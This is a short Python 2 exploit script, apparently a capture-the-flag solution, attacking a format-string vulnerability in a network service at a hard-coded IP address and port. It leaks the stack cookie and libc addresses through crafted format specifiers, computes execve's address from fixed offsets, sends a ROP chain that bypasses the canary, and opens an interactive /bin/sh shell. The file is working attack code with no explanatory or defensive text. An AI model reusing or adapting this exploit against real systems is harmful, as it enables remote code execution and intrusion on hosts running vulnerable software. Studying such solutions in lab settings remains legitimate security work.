from isis import *
import re
def make_fmt(s):
	return s+'A'*(0x80-len(s)-1)+'\n'

def get_cookie(s):
	s.send(make_fmt('%78$p'))
	time.sleep(1)
	cookie=int(re.findall('0x\w{8}',s.recv(0x1000))[0],16)
	return cookie

def get_main(s):
	s.send(make_fmt('%79$p'))
	time.sleep(1)	
	main=int(
			re.findall('0x\w{8}',s.recv(0x1000))[0]
				,16)-0x264
	return main

def get_my_str(s):
	s.send(make_fmt('%10$p'))
	time.sleep(1)
	my_str=int(re.findall('0x\w{8}',s.recv(0x1000))[0],16)
	return my_str-0x1a8

def get_plt(s):
	return get_main(s)-0x27c

def get_got(s):
	return get_main(s)+0x15F8

def get_sock_login(chal):
	s=get_socket(chal)
	s.send('letmein\n')
	time.sleep(1)	
	junk=s.recv(0x1000)
	return s

def read_ptr(s,ptr):
	fmt=make_fmt('%16$sAAA'+pack("I",ptr))
	s.send(fmt)
	time.sleep(1)
	return unpack("I",s.recv(0x10000)[:4])[0]

def get_base_libc(s):
	got=get_got(s)
	read=read_ptr(s,got)
	print 'read '+hex(read)
	#libc=read-0x00df210
	#libc=read-0x000bf110
	#libc=read-0x00e1600
	libc=read-0x00de3a0
	return libc

def get_system(s):
	libc=get_base_libc(s)
	#return libc+0x003f430
	#return libc+0x0039450
	#return libc+0x0041060
	return libc+0x003f430

def get_execve(s):
	libc=get_base_libc(s)
	#return libc+0x00b90c0
	#return libc+0x00098970
	#return libc+0x000bb110
	return libc+0x00b8240

def end(s):
	s.send('/bin/sh\0\n')
	return s

def exploit(s,rop):
	s.send(make_fmt('%256x{}'.format(rop)))


def fix_cookie(s):
	s.send(make_fmt('%{}x'.format(0x100-0x80+5)))

def create_rop(cookie,system,arg):
	return lei(cookie, 0x42424242,0x42424242,0x42424242, system, 0x43434343, arg,arg+0x10,arg+0x10)

def crash(chal):
	s=get_sock_login(chal)
	libc=get_base_libc(s)
	cookie=get_cookie(s)+1
	execve=get_execve(s)
	string_location=get_my_str(s)
	print 'cookie {}\nexecve {}\nargument {}\nlibc {}'.format(
			*map(hex,[cookie, execve, string_location,libc]))
	rop=create_rop(cookie+1,execve,string_location)
	exploit(s,rop)
	fix_cookie(s)
	time.sleep(1)
	junk=s.recv(0x100000)
	#raw_input('debug')
	end(s)
	return s


#s=crash(('localhost',2323))
s=crash(('109.233.61.11',3129))

telnet_shell(s)
